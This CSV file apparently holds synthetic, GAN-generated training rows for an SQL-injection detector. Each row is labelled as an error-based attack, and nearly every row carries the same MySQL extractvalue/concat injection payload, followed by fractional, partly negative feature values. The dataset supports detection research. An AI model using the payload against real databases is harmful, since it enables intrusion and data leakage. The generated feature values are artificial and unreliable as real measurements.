id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000140,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.812236718910429,146.6737060546875,48.24490737915039,23.644277572631836,52.60076904296875,0.07917098701000214,46.124298095703125,19.357749938964844,1.0326555967330933,0.30527210235595703,0.19319604337215424,0.36805418133735657,0.11603987962007523,3.761690855026245,0.820951521396637,0.5290692448616028,0.5873373746871948,0.0785789042711258,0.3022574186325073,-0.018801355734467506,4.988605976104736,5.03670597076416,3.274792432785034,-0.03735654801130295,1.0275475978851318,-0.10297805070877075,0.05195024237036705,0.15939760208129883,-0.13987088203430176,0.010731842368841171,0.19885000586509705,0.16435763239860535,2.082786798477173,0.020967159420251846,0.560708224773407,1.1444214582443237,3.8894848823547363,0.4710609018802643,1.1244643926620483,0.04838970676064491,0.12242713570594788,0.4777078330516815,0.042138244956731796,0.1987238973379135,-0.08384639024734497,0.09303347766399384,0.10073824226856232,0.167401522397995,0.1431087851524353,0.22859303653240204,0.013017237186431885,0.26193496584892273,-0.08562016487121582,0.059934504330158234,0.05149483680725098,-0.14914044737815857,-0.062143463641405106,-0.05748444050550461,0.11070138216018677,0.46303898096084595,-0.052409544587135315,0.07441405951976776,-0.02218739688396454,0.21327057480812073,0.4623038172721863,-0.013665065169334412,0.6912355422973633,0.01683776080608368,-0.15824855864048004,-0.22615981101989746,0.27669256925582886,-0.13192856311798096,0.03252715244889259,0.12781170010566711,0.009113148786127567,0.001313102780841291,0.778525173664093,0.24822595715522766,-0.1026364415884018,-0.014941547997295856,0.0013277903199195862,5.076320648193359,0.34480616450309753,0.07700091600418091,0.21173717081546783,0.8715714812278748,0.030934985727071762,0.04390138015151024,0.03756939619779587
GAN_000141,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.741083598713893,147.75328063964844,46.120018005371094,26.008037567138672,54.15333557128906,1.0925140380859375,46.86110305786133,18.670448303222656,1.0227727890014648,0.3167155981063843,0.18893201649188995,0.37102800607681274,0.11667119711637497,3.786562442779541,0.6585857272148132,0.4721870422363281,0.5808300971984863,0.11833946406841278,0.3004192113876343,-0.029208416119217873,4.857402324676514,5.280100345611572,3.4511516094207764,0.2181602418422699,1.0993428230285645,-0.011205949820578098,-0.07801643759012222,0.20315372943878174,-0.03873460367321968,0.00014214441762305796,0.19994622468948364,0.07723010331392288,2.0870580673217773,-0.05854009464383125,0.5139894485473633,1.0490697622299194,3.882575273513794,0.5258726477622986,1.0949387550354004,0.07790054380893707,0.05021262541413307,0.44001173973083496,-0.07704197615385056,0.199225053191185,-0.17968910932540894,-0.0045340582728385925,-0.07032949477434158,0.20791316032409668,0.21683956682682037,0.2136276215314865,0.13460925221443176,0.20404839515686035,-0.11449596285820007,-0.09136790037155151,-0.06734901666641235,-0.060576967895030975,-0.05677336826920509,0.02471112087368965,0.01597309112548828,0.1054706871509552,-0.0719265341758728,0.033936284482479095,0.0853259488940239,-0.018557289615273476,0.38846132159233093,-0.025523027405142784,0.6062185168266296,-0.10340456664562225,-0.0922989770770073,-0.03963548690080643,0.14901021122932434,-0.045686811208724976,-0.03480546176433563,-0.037614718079566956,0.014871752820909023,0.009264356456696987,0.7484889030456543,0.2906939685344696,0.12130922079086304,0.041304923593997955,-0.0035842731595039368,4.876073837280273,0.3410874307155609,0.0862160176038742,0.15636664628982544,0.8062117695808411,-0.026429302990436554,-0.013293705880641937,-0.033099278807640076
GAN_000142,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,3.815181329556574,148.36753845214844,45.893028259277344,25.784217834472656,53.62784957885742,1.5205532312393188,46.87651824951172,18.553665161132812,0.9427851438522339,0.3090979754924774,0.18403267860412598,0.37003710865974426,0.11714103817939758,3.776576042175293,0.5921993255615234,0.6550021171569824,0.6335123777389526,0.1334318369626999,0.34194764494895935,-0.21176449954509735,4.837765693664551,5.225396156311035,2.928293228149414,0.19637233018875122,1.1459627151489258,0.09895309805870056,0.02999681979417801,0.22052767872810364,0.12828944623470306,0.00965192262083292,0.21082007884979248,0.007494300603866577,2.0865511894226074,-0.09261514246463776,0.4633748531341553,1.1284241676330566,3.8864502906799316,0.5106317400932312,1.0789231061935425,-0.056855276226997375,0.08705325424671173,0.39053717255592346,-0.02947711944580078,0.23435330390930176,-0.07192903012037277,-0.04988863319158554,0.014290586113929749,0.20472748577594757,0.21238406002521515,0.23848766088485718,0.1835414320230484,0.25979170203208923,-0.1109430342912674,0.10576032847166061,-0.02546144276857376,0.04295182228088379,-0.08064399659633636,0.05702047049999237,-0.10157053172588348,0.13502541184425354,0.03629548102617264,-0.011593017727136612,0.0028442367911338806,0.009976264089345932,0.4132393002510071,-0.03205466642975807,0.6417697072029114,0.003969050943851471,-0.12566891312599182,0.019713349640369415,0.0745529904961586,-0.07620172202587128,-0.0400223582983017,-0.07377071678638458,0.013742264360189438,0.015413112007081509,0.7163121104240417,0.2146681249141693,0.1441790759563446,0.044479046016931534,0.0733172670006752,5.033222675323486,0.30444687604904175,0.026856355369091034,0.21908773481845856,0.8477851748466492,0.013608086854219437,0.01573844999074936,-0.000809989869594574
GAN_000143,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.9273383850227694,147.74574279785156,46.5210075378418,25.818647384643555,53.63867950439453,0.69161456823349,48.21723556518555,18.642578125,0.898659348487854,0.3014179766178131,0.18219201266765594,0.36870554089546204,0.11397211998701096,3.7893238067626953,0.798907458782196,0.5314487218856812,0.5846001505851746,0.09007392823696136,0.3447779417037964,-0.1645786315202713,4.870498180389404,5.362057685852051,3.070167303085327,0.09296482801437378,1.0148718357086182,0.029758550226688385,-0.1139446571469307,0.19687215983867645,0.0676986426115036,-0.000796839187387377,0.26994872093200684,0.031097017228603363,2.0805366039276123,-0.04229503497481346,0.5279236435890198,1.0849227905273438,3.8858346939086914,0.5586023926734924,0.9777928590774536,-0.053787440061569214,0.10666743665933609,0.40417465567588806,-0.15852883458137512,0.20683996379375458,-0.17415793240070343,0.08398742228746414,0.1488448530435562,0.2250538468360901,0.2822844088077545,0.27613553404808044,0.16741323471069336,0.27319589257240295,-0.04637342691421509,-0.034985605627298355,-0.031556010246276855,0.1386147141456604,-0.21464680135250092,0.12394463270902634,-0.06500481814146042,0.27082082629203796,-0.017871595919132233,0.26535165309906006,0.0689920037984848,0.13420090079307556,0.39549967646598816,-0.011596068739891052,0.6052245497703552,-0.03485085815191269,-0.09789155423641205,-0.1350736916065216,0.04778238385915756,-0.07829058170318604,0.03857823461294174,-0.04301847517490387,-0.0015312290051952004,0.0037294316571205854,0.6832643151283264,0.20046386122703552,0.11974102258682251,0.007201689761132002,-0.0713505670428276,4.449981689453125,0.37761038541793823,0.11359027028083801,0.15951232612133026,0.876545786857605,0.12941910326480865,0.06449733674526215,0.08751394599676132
GAN_000144,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7443918999578476,147.9857635498047,45.98085403442383,27.74802017211914,53.44872283935547,0.622771680355072,46.31986999511719,18.555728912353516,0.9417139887809753,0.30178937315940857,0.1831986904144287,0.3681773543357849,0.11850102990865707,3.7858870029449463,0.9370640516281128,0.5415888428688049,0.6654908657073975,0.10520070791244507,0.33678677678108215,-0.038311876356601715,4.921557903289795,5.281118869781494,3.8045780658721924,0.06659581512212753,1.0386559963226318,0.0977611392736435,-0.005446239840239286,0.2269172966480255,0.1251966953277588,0.023171568289399147,0.13508594036102295,-0.0788392424583435,2.1076149940490723,0.05709047242999077,0.440041184425354,1.196392297744751,3.9208807945251465,0.39304664731025696,1.0519285202026367,-0.21789111196994781,0.1481941193342209,0.5238169431686401,0.11680478602647781,0.140904501080513,-0.050888095051050186,0.12886810302734375,-0.00033530592918395996,0.2550868093967438,0.2535223364830017,0.2864729166030884,0.15210911631584167,0.303976446390152,-0.04595477879047394,8.568912744522095e-05,0.024550417438149452,0.12097063660621643,0.018328595906496048,0.19331642985343933,-0.10159405320882797,0.2502121031284332,-0.029576122760772705,0.16071292757987976,-0.06890876591205597,0.10782037675380707,0.321065217256546,0.04419180750846863,0.5530744791030884,-0.04701898247003555,-0.01988525688648224,0.019826948642730713,-0.06205003708600998,-0.19135893881320953,-0.022048644721508026,-0.04753413796424866,0.009257824160158634,0.012965512461960316,0.7525360584259033,0.16818131506443024,-0.0037592798471450806,0.01740623638033867,-0.04560384899377823,5.312283515930176,0.37158113718032837,0.18294358253479004,0.16278980672359467,0.7944299578666687,-0.06725092232227325,0.11177338659763336,0.09139799326658249
GAN_000145,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7095653099241592,147.95321655273438,45.98934555053711,26.871999740600586,54.52092742919922,1.1687871217727661,47.33190155029297,18.44076919555664,0.9909715056419373,0.3141588866710663,0.18884877860546112,0.36922892928123474,0.11617507040500641,3.7750251293182373,0.6878328919410706,0.41314226388931274,0.5741276144981384,0.1463625431060791,0.2508944869041443,0.11040762066841125,4.744986057281494,5.272511959075928,3.7159929275512695,0.19798648357391357,1.0822954177856445,0.01713128387928009,-0.15551495552062988,0.2206866592168808,-0.03461569920182228,0.0004783388285432011,0.16691040992736816,0.010814748704433441,2.13877272605896,-0.05385931208729744,0.47927990555763245,1.0882874727249146,3.878993034362793,0.5396780967712402,1.0207293033599854,0.08512432873249054,0.054254405200481415,0.49319496750831604,-0.012074194848537445,0.18982866406440735,-0.0798899233341217,0.014513105154037476,0.01528768241405487,0.21804416179656982,0.22475092113018036,0.22473761439323425,0.14690105617046356,0.1976180225610733,-0.042884282767772675,-0.09817120432853699,-0.02790350466966629,0.025741606950759888,-0.0821085125207901,0.13785114884376526,0.004517309367656708,0.16363808512687683,-0.09416759014129639,-0.038727693259716034,0.048548806458711624,0.07118234038352966,0.35627347230911255,-0.005484186112880707,0.5921410322189331,-0.058830007910728455,-0.008939088322222233,-0.015401549637317657,0.11185313761234283,-0.08657494932413101,-0.11329645663499832,-0.022342905402183533,0.011109813116490841,0.012454457581043243,0.7817836403846741,0.3033784031867981,0.11892306804656982,0.04887654259800911,0.03094974160194397,4.9779582023620605,0.32744160294532776,0.22481389343738556,0.15790414810180664,0.7464532852172852,-0.10844285786151886,-0.0566326305270195,-0.04805761203169823
GAN_000146,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7541984301496605,146.74879455566406,46.610408782958984,25.271583557128906,53.381587982177734,-0.7962349057197571,46.85626220703125,19.587177276611328,1.3141942024230957,0.3013150990009308,0.19656239449977875,0.3649272918701172,0.11973494291305542,3.760636329650879,1.1865073442459106,0.4674110412597656,0.6648970246315002,0.18442004919052124,0.265209436416626,0.31834715604782104,4.9657697677612305,4.9931135177612305,3.7805511951446533,-0.019883938133716583,1.0081079006195068,-0.05452955141663551,-0.12808947265148163,0.25521597266197205,-0.16012507677078247,0.011902766302227974,0.20794659852981567,-0.00407516211271286,2.3614087104797363,0.25870659947395325,0.47715964913368225,1.0693707466125488,3.6891469955444336,0.13127858936786652,1.0763338804244995,0.18963481485843658,0.0980161651968956,0.4282161295413971,0.12769417464733124,0.19267071783542633,-0.0908581018447876,0.2840375304222107,-0.05037511885166168,0.2942262291908264,0.08715313673019409,0.20395909249782562,0.04675459861755371,0.3681972026824951,-0.12139721214771271,-0.25095388293266296,0.019180506467819214,-0.18984949588775635,-0.06526806950569153,-0.05698586255311966,0.21541936695575714,0.17942342162132263,-0.23358944058418274,0.3034815192222595,0.07638053596019745,0.24187910556793213,0.35717594623565674,-0.0738787055015564,0.597770094871521,0.0033542662858963013,0.030668649822473526,-0.23913386464118958,0.20011258125305176,-0.09948543459177017,-0.10666186362504959,0.20393729209899902,0.0182762760668993,0.02156108245253563,0.6248493194580078,0.17066022753715515,-0.12277863919734955,-0.012100216932594776,-0.08378423005342484,5.333190441131592,0.3216375410556793,0.19156846404075623,0.05015252158045769,0.8327165842056274,-0.23211921751499176,0.3161899447441101,-0.11663907021284103
GAN_000147,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7238711846211716,148.25054931640625,46.84546661376953,28.25931739807129,52.871673583984375,1.6127004623413086,46.37255859375,19.145320892333984,1.3188905715942383,0.3007071614265442,0.19550256431102753,0.36891573667526245,0.11629607528448105,3.737152576446533,0.7293607592582703,0.3422141373157501,0.7663987278938293,0.18063665926456451,0.30608242750167847,-0.07552270591259003,4.874090671539307,5.158754348754883,3.4277806282043457,0.23614194989204407,1.033972144126892,0.05320348963141441,-0.02968914806842804,0.31598716974258423,-0.11570177972316742,0.00047967155114747584,0.21787601709365845,0.23117372393608093,2.123825788497925,0.11696252226829529,0.5261813402175903,1.2102826833724976,3.8507285118103027,0.3346480429172516,1.0144392251968384,0.02490508183836937,0.07810281962156296,0.3759070336818695,-0.13748693466186523,0.11638300120830536,-0.24287131428718567,0.1221458911895752,-0.1888521909713745,0.18733884394168854,0.2418992966413498,0.14714013040065765,0.011687487363815308,0.24008208513259888,-0.35963675379753113,0.1243155226111412,0.08028394728899002,-0.031427063047885895,-0.06972795724868774,0.2534308135509491,0.003509730100631714,0.022260919213294983,0.05962219089269638,0.24637897312641144,0.06319117546081543,0.1950136423110962,0.4519897401332855,-0.08793866634368896,0.700930118560791,-0.2924143075942993,-0.03843481093645096,-0.17290297150611877,0.2024233639240265,-0.20952680706977844,-0.23939675092697144,-0.04864899814128876,0.016651252284646034,0.02127029001712799,0.7463517785072327,0.26435279846191406,0.13816635310649872,-0.013552513904869556,-0.1677989959716797,4.918244361877441,0.30977216362953186,0.19375286996364594,0.1395936906337738,0.8068339228630066,-0.20980870723724365,0.06528635323047638,-0.04816456139087677
GAN_000148,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.672372723354003,147.5670928955078,46.037899017333984,26.84125518798828,53.7143669128418,0.2652810215950012,47.82149124145508,19.306718826293945,1.198001742362976,0.3029323220252991,0.19150492548942566,0.3685329854488373,0.11789518594741821,3.7573323249816895,0.9524556398391724,0.5160769820213318,0.6382429599761963,0.1660851687192917,0.2199718952178955,0.1850615292787552,4.804076194763184,5.1430816650390625,3.530400514602661,0.10991226136684418,1.028513789176941,-0.03942335397005081,-0.17856140434741974,0.30799347162246704,-0.07321888208389282,-0.0016067965188995004,0.22572702169418335,0.012250572443008423,2.3097927570343018,0.147709921002388,0.4633861780166626,1.1156203746795654,3.742253303527832,0.2670763432979584,1.0070655345916748,0.10397715866565704,0.058069124817848206,0.4430626332759857,0.055025242269039154,0.21622249484062195,-0.04133026301860809,0.1583179384469986,-0.059163667261600494,0.28915664553642273,0.16787108778953552,0.14919762313365936,0.11970330774784088,0.2888873219490051,-0.17773103713989258,-0.2242240011692047,-0.10979075729846954,0.07704988121986389,0.03686845675110817,0.19127464294433594,-0.09508057683706284,0.15099620819091797,-0.06109726428985596,0.21448899805545807,0.07747022062540054,0.15978887677192688,0.43003585934638977,-0.03340320289134979,0.6497506499290466,-0.18928059935569763,-0.06357786059379578,-0.25763005018234253,0.13654887676239014,-0.2111607789993286,-0.2553960084915161,0.0516982302069664,0.008349397219717503,0.0261920727789402,0.6876441240310669,0.1915661245584488,0.04859916493296623,0.03287056088447571,-0.14051109552383423,4.918872833251953,0.3039909601211548,0.23950621485710144,0.02504834160208702,0.845782995223999,-0.18303252756595612,0.06549175083637238,-0.16731828451156616
GAN_000149,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.841192201617246,147.4392547607422,47.748409271240234,24.5074405670166,53.697181701660156,1.3277472257614136,47.12406921386719,18.801183700561523,1.3292479515075684,0.30088430643081665,0.1835351139307022,0.3697921335697174,0.11656833440065384,3.7587289810180664,0.7964233160018921,0.7089671492576599,0.6917493343353271,0.09505675733089447,0.24628011882305145,-0.09718525409698486,4.871139049530029,5.030030727386475,3.487348794937134,0.17571942508220673,1.0960408449172974,-0.10606779158115387,0.02387119084596634,0.220994234085083,-0.16436684131622314,0.00018793754861690104,0.23899483680725098,0.23775914311408997,2.1342830657958984,0.10451582074165344,0.5107463598251343,1.0086135864257812,3.696915864944458,0.19085757434368134,1.0458054542541504,0.1239757388830185,0.09694177657365799,0.45443111658096313,-0.09263098984956741,0.17657464742660522,-0.16731244325637817,0.11561095714569092,-0.18205346167087555,0.22437673807144165,0.11493176221847534,0.18426921963691711,0.0559663325548172,0.35526043176651,-0.276057630777359,0.004997231066226959,0.09204438328742981,-0.018595196306705475,-0.1094857007265091,0.03965481370687485,0.2696523070335388,0.10014881193637848,-0.16127781569957733,0.41073209047317505,0.028812967240810394,0.026088152080774307,0.3957352340221405,0.007987108081579208,0.650615930557251,-0.10535652190446854,-0.014231723733246326,-0.23295897245407104,0.12667129933834076,-0.17835940420627594,-0.15581169724464417,0.021386802196502686,0.019609803333878517,0.022525127977132797,0.6325836181640625,0.20916496217250824,0.13679121434688568,-0.040305327624082565,-0.10804792493581772,4.8864359855651855,0.36761412024497986,0.1700325757265091,0.06579197943210602,0.8303680419921875,-0.11639504134654999,0.25275668501853943,-0.0216042622923851
GAN_000150,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.785238636735924,146.92697143554688,47.61069107055664,24.651525497436523,53.90580368041992,0.39173561334609985,45.88637161254883,19.045360565185547,1.0792123079299927,0.3066478967666626,0.18718329071998596,0.3682555854320526,0.1180124282836914,3.7905993461608887,0.9706346988677979,0.5997980237007141,0.6919478178024292,0.07787822932004929,0.313586950302124,0.12476764619350433,4.989868640899658,5.0631256103515625,3.75032377243042,0.05713774263858795,0.9977941513061523,-0.07068849354982376,0.06781500577926636,0.17298585176467896,-0.13343939185142517,0.013992860913276672,0.12716734409332275,0.10667983442544937,2.0340373516082764,0.07121153920888901,0.5100869536399841,0.9767990112304688,3.736353874206543,0.29344624280929565,1.0829486846923828,0.04001026973128319,0.13191767036914825,0.5185834765434265,0.10638187825679779,0.1595069319009781,-0.13034935295581818,0.17452122271060944,-0.015221796929836273,0.24848419427871704,0.14422808587551117,0.23960942029953003,0.0795450508594513,0.38134875893592834,-0.0020247921347618103,-0.06925155222415924,-0.01889668218791485,-0.1317971646785736,-0.06145494058728218,-0.05963854119181633,0.13529251515865326,0.21662938594818115,-0.15115903317928314,0.15326274931430817,-0.051266685128211975,0.10319174826145172,0.3733312785625458,-0.003849383443593979,0.5775328874588013,0.012712851166725159,-0.02175186201930046,-0.11889547854661942,0.11592696607112885,-0.17007550597190857,-0.04709405452013016,0.03492623567581177,0.01309661753475666,0.013597369194030762,0.7005528807640076,0.1514810174703598,-0.04502148926258087,-0.02130569890141487,-0.06551498919725418,4.86385440826416,0.3852345049381256,0.03214491158723831,0.09825902432203293,0.8629381060600281,-0.02638138085603714,0.19729498028755188,-0.042300451546907425
GAN_000151,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.8703479001553474,146.82418823242188,47.081329345703125,24.384307861328125,53.845176696777344,-0.2989552617073059,47.08669662475586,19.363224029541016,0.845382571220398,0.2977605164051056,0.19536054134368896,0.37028834223747253,0.11685815453529358,3.7892470359802246,0.8424928188323975,0.6631051301956177,0.6192214488983154,0.08818293362855911,0.39447668194770813,0.20529143512248993,4.892539978027344,5.247359275817871,3.7988617420196533,0.0904461070895195,0.9118024706840515,0.056140247732400894,-0.09436989575624466,0.09723998606204987,-0.03941810131072998,0.014066261239349842,0.13443219661712646,0.004209354519844055,2.0862650871276855,-0.07241895794868469,0.4717353582382202,0.9753588438034058,3.877492666244507,0.4085104763507843,1.0685962438583374,0.05937090143561363,0.056014057248830795,0.48714733123779297,-0.013951405882835388,0.2058936506509781,-0.05751687288284302,-0.014901302754878998,0.18524937331676483,0.26730167865753174,0.2115534245967865,0.28803908824920654,0.09530375897884369,0.25925323367118835,0.08439914882183075,-0.05815134942531586,-0.1653430014848709,-0.08892329782247543,0.02077641896903515,0.06858433783054352,-0.07798190414905548,0.24938344955444336,-0.02291484922170639,0.00870872288942337,-0.1652095764875412,0.08418093621730804,0.4248846769332886,0.03971978276968002,0.47612711787223816,0.178041473031044,-0.08274734020233154,0.037040360271930695,0.009169630706310272,-0.19489523768424988,-0.13238823413848877,-0.05843229591846466,0.018767941743135452,0.0013798329746350646,0.8544454574584961,0.17073798179626465,0.060858145356178284,0.0017442547250539064,0.025370270013809204,4.568638801574707,0.441542387008667,0.06330506503582001,0.07088693976402283,0.9372951984405518,0.15107576549053192,0.20032203197479248,-0.0014437735080718994
GAN_000152,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7376462715723657,147.68740844726562,46.60932540893555,25.463584899902344,53.94871520996094,0.2580856680870056,46.450172424316406,18.89348030090332,1.0566710233688354,0.3104759752750397,0.18841670453548431,0.3682727515697479,0.12007194012403488,3.78733491897583,0.8868128061294556,0.6483913660049438,0.6408664584159851,0.10532581806182861,0.3317268490791321,0.09690717607736588,4.879176139831543,5.068652153015137,3.7680633068084717,-0.003088630735874176,1.0841583013534546,-0.0620822049677372,-0.004634845070540905,0.17615506052970886,-0.1601615846157074,0.021440258249640465,0.14587995409965515,-0.020256303250789642,2.050135374069214,-0.037267331033945084,0.48900142312049866,1.1123074293136597,3.864823818206787,0.34000226855278015,1.1024143695831299,0.03037935122847557,0.08291207253932953,0.44425326585769653,0.0511479377746582,0.18896858394145966,-0.09601898491382599,0.2257969081401825,-0.03350970894098282,0.2422751635313034,0.17128558456897736,0.2188265472650528,0.09182500839233398,0.3219601809978485,-0.04240591824054718,-0.032615017145872116,-0.0022697551175951958,-0.09660155326128006,-0.09639792144298553,-0.01753721944987774,0.03168399631977081,0.22194120287895203,-0.030546113848686218,0.0678250789642334,-0.10699361562728882,0.10674677789211273,0.33651676774024963,-0.0968702882528305,0.5828662514686584,0.054310545325279236,-0.009499738924205303,-0.025613635778427124,0.13787253201007843,-0.016483360901474953,0.0010661855340003967,0.09941986203193665,0.024729406461119652,0.009767585434019566,0.740045964717865,0.21632583439350128,0.030391819775104523,0.004049337934702635,0.011070571839809418,5.256404399871826,0.3539130389690399,0.12100529670715332,0.1638246774673462,0.8373278975486755,-0.05282624810934067,0.24531099200248718,-0.06097542494535446
GAN_000153,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.716171932271517,147.2462921142578,46.529972076416016,26.791135787963867,53.90364456176758,0.44090479612350464,46.83662033081055,18.94578742980957,1.0522228479385376,0.3218253254890442,0.19472962617874146,0.36802294850349426,0.11829516291618347,3.7930805683135986,0.8582112789154053,0.355619341135025,0.5370620489120483,0.13541965186595917,0.3185279071331024,0.28766483068466187,4.948714733123779,5.188116073608398,4.014410018920898,0.07777349650859833,1.0661284923553467,0.058238785713911057,-0.06380503624677658,0.319681853055954,0.032610658556222916,0.012282404117286205,0.15895819664001465,-0.14885784685611725,2.256911277770996,0.041107699275016785,0.5013575553894043,1.2097450494766235,3.890577793121338,0.3848704397678375,1.1133192777633667,-0.1088094562292099,0.13319526612758636,0.4329445958137512,0.11409653723239899,0.17299756407737732,-0.09582335501909256,0.13758644461631775,0.0389510840177536,0.24091321229934692,0.2843855023384094,0.23546601831912994,0.15518033504486084,0.19905897974967957,-0.061667874455451965,-0.26101821660995483,-0.029498035088181496,-0.01919092983007431,-0.05198531970381737,0.02998039871454239,-0.06115264073014259,0.24065014719963074,-0.016753971576690674,0.10888385772705078,0.1005525141954422,0.11655579507350922,0.3140197992324829,0.07225026935338974,0.5745872855186462,-0.10626070201396942,-0.047562357038259506,-0.12471089512109756,0.05035916715860367,-0.19248376786708832,-0.11099960654973984,-0.038254305720329285,0.004920226521790028,0.0045579420402646065,0.7585077881813049,0.2498180866241455,-0.03890605270862579,0.041345614939928055,-0.09378588944673538,5.123244285583496,0.3216201364994049,0.17668068408966064,0.15511766076087952,0.800757110118866,-0.2191651314496994,0.0390746183693409,-0.003442615270614624
